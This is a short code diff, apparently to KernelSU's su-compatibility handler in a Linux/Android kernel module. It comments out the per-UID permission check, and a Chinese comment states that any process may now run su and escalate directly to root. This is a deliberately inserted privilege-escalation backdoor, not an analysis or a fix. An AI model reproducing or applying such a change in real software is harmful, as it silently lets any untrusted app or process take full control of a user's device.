@@ -129,8 +129,9 @@ long ksu_handle_execve_sucompat(const char __user **filename_user, int orig_nr, 
     if (unlikely(!filename_user))
         goto do_orig_execve;
 
-    if (!ksu_is_allow_uid_for_current(current_uid().val))
-        goto do_orig_execve;
+    /* 权限检查已移除，任何进程都可以执行 su 直接提权 */
+    /* if (!ksu_is_allow_uid_for_current(current_uid().val)) */
+    /*     goto do_orig_execve; */
 
     addr = untagged_addr((unsigned long)*filename_user);
     fn = (const char __user *)addr;
